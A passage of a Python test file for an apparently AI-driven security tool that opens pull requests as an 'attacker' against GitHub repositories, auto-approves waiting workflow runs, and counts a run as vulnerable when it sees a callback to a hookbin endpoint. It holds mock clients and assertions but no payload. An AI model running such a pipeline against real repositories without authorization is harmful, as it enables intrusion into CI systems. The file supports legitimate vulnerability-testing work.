        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 777,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(
                "1_Set up job.txt",
                "runner bootstrap\n##[error]Failed to start runner process",
            )
        return buffer.getvalue()


class _CheckoutFailureMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 778,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(
                "2_Checkout.txt",
                "checking out ref\n##[error]Repository not found",
            )
        return buffer.getvalue()


class _CheckoutFailureInValidateLogMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 779,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        content = "\n".join(
            [
                "2026-03-18T21:19:47.2092461Z ##[group]Run actions/checkout@v4",
                "2026-03-18T21:19:47.2093018Z with:",
                "2026-03-18T21:19:47.2093253Z   ref: feature/temp-change-1773868456",
                "2026-03-18T21:20:19.2188324Z [command]/usr/bin/git -c protocol.version=2 fetch origin +refs/heads/feature/temp-change-1773868456*",
                "2026-03-18T21:20:19.3653796Z ##[error]The process '/usr/bin/git' failed with exit code 1",
                "2026-03-18T21:20:19.3817029Z ##[group]Run actions/upload-artifact@v4",
                "2026-03-18T21:20:19.3817360Z with:",
                "2026-03-18T21:20:19.8712793Z ##[warning]Node.js 20 actions are deprecated: actions/checkout@v4, actions/upload-artifact@v4",
            ]
        )
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("6_Validate _ Validate.txt", content)
        return buffer.getvalue()


class _NoCheckoutFailureMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 780,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        content = "\n".join(
            [
                "2026-03-18T19:21:29.4131965Z ##[group]Run actions/checkout@v4",
                "2026-03-18T19:21:31.7667063Z ##[group]Checking out the ref",
                "2026-03-18T19:21:31.7670609Z [command]/usr/bin/git checkout --progress --force 60a6c0ac",
                "2026-03-18T19:21:31.8636119Z Note: switching to '60a6c0ac'.",
                "2026-03-18T19:21:33.0000000Z ##[group]Run make lint",
                "2026-03-18T19:21:42.9613452Z ##[error]Process completed with exit code 1.",
                "2026-03-18T19:21:43.1974594Z ##[warning]Node.js 20 actions are deprecated: actions/checkout@v4, actions/setup-python@v5.",
            ]
        )
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("3_backend-lint.txt", content)
        return buffer.getvalue()


class _ApprovalRequiredMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0
        self.approved_runs: list[int] = []

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        if self.get_workflow_runs_calls == 1:
            return {
                "workflow_runs": [
                    {
                        "id": 303,
                        "head_sha": "abc123",
                        "status": "waiting",
                        "conclusion": None,
                        "pull_requests": [{"number": 42}],
                    }
                ]
            }
        return {
            "workflow_runs": [
                {
                    "id": 303,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def approve_workflow_run(self, repo_name: str, run_id: int) -> dict[str, object]:
        _ = repo_name
        self.approved_runs.append(run_id)
        return {"approved": True}

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        return b""


class _ActionRequiredConclusionMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0
        self.approved_runs: list[int] = []

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        if self.get_workflow_runs_calls == 1:
            return {
                "workflow_runs": [
                    {
                        "id": 404,
                        "head_sha": "abc123",
                        "status": "completed",
                        "conclusion": "action_required",
                        "pull_requests": [{"number": 42}],
                    }
                ]
            }
        return {
            "workflow_runs": [
                {
                    "id": 404,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "failure",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def approve_workflow_run(self, repo_name: str, run_id: int) -> dict[str, object]:
        _ = repo_name
        self.approved_runs.append(run_id)
        return {"approved": True}

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        return b""


class _RetryControllerSignalSandbox:
    def __init__(self, signal: dict[str, object]) -> None:
        self._signal = signal

    def read_file(self, relative_path: str) -> str | None:
        if relative_path == "agent-output.json":
            return json.dumps(self._signal)
        return None


def test_monitor_workflow_waits_for_all_pr_runs(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _MultiRunMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"local_test_result": "not_executed_yet"}),
        encoding="utf-8",
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=workspace_path,
        sandbox=object(),  # unused when max_retries=1
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result["attempts"]
    assert "agent_output" in result["attempts"][0]
    assert result["attempts"][0]["agent_output"]["local_test_result"] == "not_executed_yet"
    assert result["attempts"][0]["act_hookbin_url"] == "http://127.0.0.1:8787/101"
    assert result["attempts"][0]["act_hookbin_api_url"] == "http://127.0.0.1:8787/api/101"
    assert result["attempts"][1]["act_hookbin_url"] == "http://127.0.0.1:8787/202"
    assert result["attempts"][1]["act_hookbin_api_url"] == "http://127.0.0.1:8787/api/202"
    assert client.get_workflow_runs_calls >= 4
    assert "101" in hookbin.checked_bin_ids
    assert "202" in hookbin.checked_bin_ids


def test_monitor_workflow_waits_for_delayed_hookbin_logs(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _MultiRunMonitorClient()
    hookbin = _HookbinDelayedLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"local_test_result": "success"}),
        encoding="utf-8",
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=workspace_path,
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is True
    assert result["run_id"] == 101
    assert result["attempt_count"] == 1
    assert result["attempts"][0]["run_id"] == 101
    assert result["attempts"][0]["agent_output"]["local_test_result"] == "success"
    assert hookbin.waited_bin_ids == ["101"]


def test_monitor_workflow_returns_vulnerable_before_run_completion_when_hookbin_has_logs(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _InProgressOnlyMonitorClient()
    hookbin = _HookbinImmediateLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"local_test_result": "success"}),
        encoding="utf-8",
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=workspace_path,
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is True
    assert result["run_id"] == 909
    assert result["conclusion"] is None
    assert result["attempt_count"] == 1
    assert result["attempts"][0]["run_id"] == 909
    assert result["attempts"][0]["agent_output"]["local_test_result"] == "success"
    assert hookbin.checked_bin_ids == ["909"]


def test_monitor_workflow_treats_empty_body_hookbin_call_as_vulnerable(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _InProgressOnlyMonitorClient()
    hookbin = _HookbinEmptyBodyCallsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"local_test_result": "success"}),
        encoding="utf-8",
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=workspace_path,
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is True
    assert result["run_id"] == 909
    assert result["hookbin_logs"] == ""
    assert result["attempt_count"] == 1
    assert result["attempts"][0]["run_id"] == 909
    assert result["attempts"][0]["agent_output"]["local_test_result"] == "success"


def test_monitor_workflow_keeps_success_from_older_head_when_pr_head_later_changes(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    client = _HeadShaSwitchingClient()
    hookbin = _HookbinSelectiveLogsTracker("100")
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is True
    assert result["run_id"] == 100


def test_monitor_workflow_approves_waiting_run_once(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _ApprovalRequiredMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert client.approved_runs == [303]


def test_monitor_workflow_approves_action_required_conclusion_once(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _ActionRequiredConclusionMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert client.approved_runs == [404]


def test_monitor_workflow_escalates_set_up_job_failure_to_human_review(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _SetUpJobFailureMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=3,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["run_id"] == 777
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert result["controller_signal"]["source"] == "workflow_set_up_job_failed"


def test_monitor_workflow_escalates_checkout_failure_to_human_review(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _CheckoutFailureMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=3,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["run_id"] == 778
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert result["controller_signal"]["source"] == "workflow_actions_checkout_failed"


def test_monitor_workflow_escalates_checkout_failure_inside_non_checkout_named_log(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _CheckoutFailureInValidateLogMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["run_id"] == 779
    assert result["controller_signal"]["source"] == "workflow_actions_checkout_failed"


def test_monitor_workflow_does_not_escalate_non_checkout_failure(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _NoCheckoutFailureMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True


def test_monitor_workflow_escalates_controller_human_review_when_retry_returns_false(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)

    client = _NoCheckoutFailureMonitorClient()
    hookbin = _HookbinNoLogsTracker()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=hookbin,
    )
    monkeypatch.setattr(service, "_retry_with_logs", lambda **kwargs: False)
    sandbox = _RetryControllerSignalSandbox(
        {
            "vulnerable": "unconfirmed",
            "human_review_needed": True,
            "reason": "Bad credentials in sticky comment action due to missing fork secrets.",
            "required_resources": ["BOT secret on User A fork"],
            "notes": "",
        }
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,
        repo_name="playground/repo",
        pr_number=42,
        max_retries=2,
        workspace_path=tmp_path / "workspace",
        sandbox=sandbox,
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=30,
        retry_openhands_runner=lambda: {"ok": True, "exit_code": 0},
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert result["reason"] == (
        "Bad credentials in sticky comment action due to missing fork secrets."
    )
    assert result["required_resources"] == ["BOT secret on User A fork"]
    assert result["controller_signal"]["status"] == "needs_human_review"


class _NoWorkflowRunsClient:
    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        return {"workflow_runs": []}

    def list_pull_request_files(
        self,
        repo_name: str,
        pull_number: int,
    ) -> list[dict[str, object]]:
        _ = (repo_name, pull_number)
        return [{"filename": "docs/readme.md"}]


def test_pull_request_has_required_path_changes_matches_path_filters() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _NoWorkflowRunsClient()

    matched, changed_paths = service._pull_request_has_required_path_changes(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        required_path_filters=["projects/app/**", "packages/**"],
    )
    assert matched is False
    assert changed_paths == ["docs/readme.md"]

    matched, changed_paths = service._pull_request_has_required_path_changes(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        required_path_filters=["docs/**"],
    )
    assert matched is True
    assert changed_paths == ["docs/readme.md"]


def test_monitor_workflow_returns_early_when_required_path_trigger_missing(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    client = _NoWorkflowRunsClient()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_HookbinNoLogsTracker(),
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=2,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=5,
        focused_workflow=".github/workflows/ci.yml",
        path_filters=["projects/app/**", "packages/**"],
        retry_openhands_runner=lambda: {"ok": True, "exit_code": 0},
    )

    assert result["vulnerable"] is False
    assert "does not include any file changes that match" in result["reason"]
    assert result["path_filters"] == ["projects/app/**", "packages/**"]
    assert result["pr_changed_files"] == ["docs/readme.md"]


def test_monitor_workflow_returns_early_when_required_path_trigger_missing_on_final_attempt(
    monkeypatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    client = _NoWorkflowRunsClient()
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        hookbin_client=_HookbinNoLogsTracker(),
    )

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="playground/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=5,
        path_filters=["projects/app/**", "packages/**"],
        retry_openhands_runner=lambda: {"ok": True, "exit_code": 0},
    )

    assert result["vulnerable"] is False
    assert "does not include any file changes that match" in result["reason"]
    assert result["path_filters"] == ["projects/app/**", "packages/**"]
    assert result["pr_changed_files"] == ["docs/readme.md"]


def test_workflow_run_matches_pr_filters_on_focused_workflow_path() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())

    assert (
        service._workflow_run_matches_pr(  # noqa: SLF001
            run={
                "id": 10,
                "head_sha": "abc123",
                "path": ".github/workflows/lint-pr.yml@main",
                "pull_requests": [{"number": 42}],
            },
            head_sha="abc123",
            pr_number=42,
            focused_workflow="lint-pr.yml",
        )
        is True
    )
    assert (
        service._workflow_run_matches_pr(  # noqa: SLF001
            run={
                "id": 11,
                "head_sha": "abc123",
                "path": ".github/workflows/release.yml@main",
                "pull_requests": [{"number": 42}],
            },
            head_sha="abc123",
            pr_number=42,
            focused_workflow="lint-pr.yml",
        )
        is False
    )


class _FocusedWorkflowClient:
    def __init__(self) -> None:
        self.calls = 0

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 321,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "path": ".github/workflows/ci.yml@main",
                    "pull_requests": [{"number": 42}],
                },
                {
                    "id": 654,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "path": ".github/workflows/other.yml@main",
                    "pull_requests": [{"number": 42}],
                },
            ]
        }


class _FocusedWorkflowMissingClient:
    def __init__(self) -> None:
        self.calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.calls += 1
        return {
            "workflow_runs": [
                {
                    "id": 654,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "path": ".github/workflows/other.yml@main",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }


def test_wait_for_workflow_runs_only_tracks_focused_workflow(monkeypatch) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _FocusedWorkflowClient()

    result = service._wait_for_workflow_runs(  # noqa: SLF001
        client=client,
        repo_name="owner/repo",
        head_sha="abc123",
        pr_number=42,
        deadline=time.time() + 5,
        poll_interval=0.01,
        focused_workflow="ci.yml",
    )

    assert result["timed_out"] is False
    assert sorted(result["runs_by_id"].keys()) == [321]


def test_wait_for_workflow_runs_returns_focused_workflow_missing_when_other_runs_finish(
    monkeypatch,
) -> None:
    now = {"value": 0.0}

    def _fake_time() -> float:
        return now["value"]

    def _fake_sleep(seconds: float) -> None:
        now["value"] += seconds

    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.time", _fake_time)
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", _fake_sleep)
    monkeypatch.setattr(
        "pwn_hunter_ai.attack.execution_service.FOCUSED_WORKFLOW_MISSING_GRACE_SECONDS",
        1.0,
    )
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _FocusedWorkflowMissingClient()

    result = service._wait_for_workflow_runs(  # noqa: SLF001
        client=client,
        repo_name="owner/repo",
        head_sha="abc123",
        pr_number=42,
        deadline=10.0,
        poll_interval=0.5,
        focused_workflow="ci.yml",
    )

    assert result["timed_out"] is False
    assert result.get("focused_workflow_missing") is True
    assert result["runs_by_id"] == {}
    observed = result.get("observed_non_focused_runs") or []
    assert isinstance(observed, list)
    assert observed and observed[0]["id"] == 654


def test_monitor_workflow_returns_human_review_when_focused_workflow_did_not_trigger(
    monkeypatch,
    tmp_path: Path,
) -> None:
    now = {"value": 0.0}

    def _fake_time() -> float:
        return now["value"]

    def _fake_sleep(seconds: float) -> None:
        now["value"] += seconds

    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.time", _fake_time)
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", _fake_sleep)
    monkeypatch.setattr(
        "pwn_hunter_ai.attack.execution_service.FOCUSED_WORKFLOW_MISSING_GRACE_SECONDS",
        1.0,
    )
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _FocusedWorkflowMissingClient()

    result = service._monitor_workflow(  # noqa: SLF001
        client=client,  # type: ignore[arg-type]
        repo_name="owner/repo",
        pr_number=42,
        max_retries=1,
        workspace_path=tmp_path / "workspace",
        sandbox=object(),
        branch_name="feature/test",
        user_b_login="attacker",
        default_branch="main",
        workflow_timeout=10,
        focused_workflow=".github/workflows/ci.yml",
        retry_openhands_runner=None,
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert "did not trigger" in result["reason"]
    assert result["controller_signal"]["source"] == "focused_workflow_not_triggered"


class _HeadShaSwitchingClient:
    def __init__(self) -> None:
        self.pull_request_calls = 0
        self.workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        self.pull_request_calls += 1
        if self.pull_request_calls == 1:
            return {"head": {"sha": "oldsha"}}
        return {"head": {"sha": "newsha"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.workflow_runs_calls += 1
        if self.workflow_runs_calls == 1:
            return {
                "workflow_runs": [
                    {
                        "id": 100,
                        "head_sha": "oldsha",
                        "status": "completed",
                        "conclusion": "success",
                        "pull_requests": [{"number": 42}],
                    }
                ]
            }
        return {
            "workflow_runs": [
                {
                    "id": 200,
                    "head_sha": "newsha",
                    "status": "completed",
                    "conclusion": "success",
                    "pull_requests": [{"number": 42}],
                }
            ]
        }


def test_wait_for_workflow_runs_switches_to_latest_pr_head_sha(monkeypatch) -> None:
    monkeypatch.setattr("pwn_hunter_ai.attack.execution_service.time.sleep", lambda _s: None)
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    client = _HeadShaSwitchingClient()

    result = service._wait_for_workflow_runs(  # noqa: SLF001
        client=client,
        repo_name="owner/repo",
        head_sha="oldsha",
        pr_number=42,
        deadline=time.time() + 5,
        poll_interval=0.01,
        focused_workflow=None,
    )

    assert result["timed_out"] is False
    assert sorted(result["runs_by_id"].keys()) == [100, 200]
    assert result["head_sha_changes"] == [{"from": "oldsha", "to": "newsha"}]


class _HeadShaNoNewWorkflowClient:
    def __init__(self) -> None:
        self.pull_request_calls = 0
        self.workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        self.pull_request_calls += 1
